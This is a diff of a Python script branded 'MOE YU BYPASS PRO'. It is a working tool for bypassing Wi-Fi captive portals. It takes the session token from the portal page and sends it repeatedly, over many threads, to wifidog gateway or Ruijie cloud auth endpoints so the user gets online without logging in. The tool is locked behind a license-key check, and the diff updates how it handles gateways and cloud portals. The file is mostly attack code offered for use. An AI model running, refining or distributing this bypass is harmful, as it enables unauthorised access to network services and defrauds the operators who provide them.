@@ -1,16 +1,4 @@
-import requests
-import re
-import urllib3
-import time
-import threading
-import logging
-import random
-import sys
-import datetime
-import subprocess
-import hashlib
-import os
-import uuid
+import requests, re, urllib3, time, threading, sys, datetime, os, uuid, socket
 from urllib.parse import urlparse, parse_qs, urljoin
 from rich.console import Console
 from rich.panel import Panel
@@ -23,22 +11,11 @@ from rich.text import Text
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 console = Console()
 
-PING_THREADS = 8
-MIN_INTERVAL = 0.05
-MAX_INTERVAL = 0.2
+URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
+PING_THREADS = 15
 
 # COLOR SYSTEM
-RED = "\033[91m"
-GREEN = "\033[92m"
-CYAN = "\033[96m"
-YELLOW = "\033[93m"
-MAGENTA = "\033[95m"
-RESET = "\033[0m"
-
-logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
-stop_event = threading.Event()
-
-URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
+RED, GREEN, CYAN, YELLOW, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[93m", "\033[0m"
 
 BABY_LOGO = """
 [bold cyan]
@@ -49,8 +26,7 @@ BABY_LOGO = """
       /  ||  
   ___/___||___
  |____________|
-[/bold cyan]
-"""
+[/bold cyan]"""
 
 BANNER = """
 [bold #00FF00]
@@ -58,19 +34,20 @@ BANNER = """
  ║║║║ ║║╣   ╚╦╝║ ║
  ╩ ╩╚═╝╚═╝   ╩ ╚═╝
       [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
-[/bold #00FF00]
-"""
+[/bold #00FF00]"""
 
+# ===============================
+# LICENSE & HWID SYSTEM
+# ===============================
 def get_hwid():
     id_file = os.path.expanduser("~/.moe_yu_id")
     try:
         if os.path.exists(id_file):
             with open(id_file, "r") as f: return f.read().strip()
-        raw_id = str(uuid.uuid4()).split('-')[0].upper()
-        new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
+        new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
         with open(id_file, "w") as f: f.write(new_id)
         return new_id
-    except: return "MOE-DEFAULT-999"
+    except: return "MOE-998A7F92-675"
 
 def check_expiry(expiry_str):
     if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
@@ -80,62 +57,56 @@ def check_expiry(expiry_str):
         return True, expiry_date.strftime('%d-%b-%Y')
     except: return True, "Lifetime"
 
-def display_hacker_flag():
+def get_current_gateway():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        gw = ".".join(s.getsockname()[0].split('.')[:-1]) + ".1"
+        s.close()
+        return gw
+    except: return "192.168.61.1"
+
+def check_license():
+    my_hwid = get_hwid()
+    os.system('clear')
     console.print(Align.center(BABY_LOGO))
     console.print(Align.center(BANNER))
-    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.2[/bold cyan]\n"))
-
-def simpler_hacker_typing(text, style="bold green"):
-    console.print("[bold #00FF00]>>> [/bold #00FF00]", end="")
-    for char in text:
-        console.print(Text(char, style=style), end="")
-        sys.stdout.flush()
-        time.sleep(0.02)
-    console.print()
-
-def success_fireworks():
-    for _ in range(15):
-        fire = " " * random.randint(1, 45) + random.choice(["✨", "💥", "🌟", "⭐"])
-        console.print(Text(fire, style=random.choice(["yellow", "cyan", "green", "white"])))
-        time.sleep(0.01)
-
-def check_license_hacker_style():
-    my_hwid = get_hwid()
-    console.clear()
-    display_hacker_flag()
-    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", title="[bold red]DEVICE INFO[/bold red]", border_style="bold cyan", expand=False)))
-    try: user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
-    except: sys.exit()
+    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", title="[red]DEVICE INFO[/red]", border_style="cyan", expand=False)))
+    
+    user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
     if not user_key: sys.exit()
+    
     try:
         res = requests.get(URL, timeout=10)
-        lines = [l.strip() for l in res.text.splitlines() if l.strip()]
-        for entry in lines:
+        for entry in res.text.splitlines():
             parts = entry.split("|")
             if user_key == parts[0].strip():
                 db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                 if db_hwid != "FREE" and db_hwid != my_hwid:
-                    console.print("\n[bold red]❌ HWID MISMATCH![/bold red]")
+                    print(f"{RED}❌ HWID MISMATCH!{RESET}")
                     sys.exit()
+                
                 is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "None")
                 if is_active:
-                    success_fireworks()
-                    simpler_hacker_typing("ACCESS_GRANTED: AUTHENTICATION SUCCESS")
-                    console.print(Align.center(f"[bold green]STATUS: ACTIVE | EXPIRY: {date_label}[/bold green]\n"))
+                    console.print(f"\n[bold green]>>> AUTHENTICATION SUCCESS[/bold green]")
+                    console.print(Align.center(f"[bold yellow]EXPIRY: {date_label}[/bold yellow]\n"))
                     return True
-        console.print("\n[bold red]❌ INVALID KEY![/bold red]")
+        print(f"{RED}❌ INVALID KEY!{RESET}")
         sys.exit()
     except:
-        console.print("\n[bold red]📡 CONNECTION ERROR![/bold red]")
+        print(f"{RED}📡 CONNECTION ERROR!{RESET}")
         sys.exit()
 
 # ===============================
-# BYPASS ENGINE WITH LIVE STATUS
+# BYPASS ENGINE
 # ===============================
-def start_bypass_process():
-    while not stop_event.is_set():
+def start_bypass():
+    while True:
         try:
             session = requests.Session()
+            session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+            
+            # ၁။ Redirect ရှာခြင်း
             r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
             if r.status_code == 204:
                 time.sleep(5)
@@ -143,44 +114,48 @@ def start_bypass_process():
             
             portal_url = r.url
             r1 = session.get(portal_url, timeout=10, verify=False)
-            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
-            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
             
-            r2 = session.get(next_url, timeout=10, verify=False)
-            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+            # ၂။ SID Extraction (URL ရော Page ထဲကပါ ရှာမည်)
+            params = parse_qs(urlparse(portal_url).query)
+            sid = (params.get('sessionId') or params.get('token') or [None])[0]
+            
             if not sid:
-                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+                sid_match = re.search(r'(?:sessionId|token)=([a-zA-Z0-9_\-]{15,})', r1.text)
                 sid = sid_match.group(1) if sid_match else None
             
             if sid:
-                p = parse_qs(urlparse(portal_url).query)
-                auth_link = f"http://{p.get('gw_address',['192.168.60.1'])[0]}:{p.get('gw_port',['2060'])[0]}/wifidog/auth?token={sid}"
-                
-                # စာတန်းတွေ ပြန်ပြပေးမည့် function
-                def pulse_ping():
-                    while not stop_event.is_set():
+                # ၃။ Cloud သို့မဟုတ် Local ခွဲခြားခြင်း
+                if "ruijienetworks.com" in portal_url or "portal-as" in portal_url:
+                    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
+                    mode = "CLOUD-FIX"
+                else:
+                    gw = get_current_gateway()
+                    auth_link = f"http://{gw}:2060/wifidog/auth?token={sid}"
+                    mode = "LOCAL-FIX"
+
+                # ၄။ Turbo Injector (အမှန်ခြစ်လေးများ ပေါ်မည့်နေရာ)
+                def pulse():
+                    while True:
                         try:
-                            session.get(auth_link, timeout=5)
-                            # ပုံထဲကလို စာတန်းလေး ပြန်ထည့်ထားသည်
-                            sys.stdout.write(f"{GREEN}[✓] SID {sid[:20]}... | Turbo Pulse Active{RESET}\n")
+                            session.get(auth_link, timeout=10, verify=False)
+                            sys.stdout.write(f"{GREEN}[✓] {mode} | SID: {sid[:12]}... | Status: ACTIVE{RESET}\n")
                             sys.stdout.flush()
                         except: pass
                         time.sleep(0.1)
 
                 for _ in range(PING_THREADS):
-                    threading.Thread(target=pulse_ping, daemon=True).start()
+                    threading.Thread(target=pulse, daemon=True).start()
                 
-                while True:
-                    try:
-                        if session.get("http://www.google.com", timeout=3).status_code == 200:
-                            time.sleep(10)
-                        else: break
-                    except: break
-        except:
-            time.sleep(5)
+                # အင်တာနက် အခြေအနေ စောင့်ကြည့်ခြင်း
+                while session.get("http://www.google.com", timeout=5).status_code == 200:
+                    time.sleep(15)
+            else:
+                sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. PLEASE OPEN BROWSER LOGIN PAGE!{RESET}\n")
+                time.sleep(5)
+        except: time.sleep(5)
 
 if __name__ == "__main__":
-    if check_license_hacker_style():
-        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
-        try: start_bypass_process()
+    if check_license():
+        console.print(Panel.fit("[bold red]🔥 MOE YU BYPASS PRO v8.5 ACTIVATED 🔥[/bold red]", border_style="white"))
+        try: start_bypass()
         except KeyboardInterrupt: sys.exit()
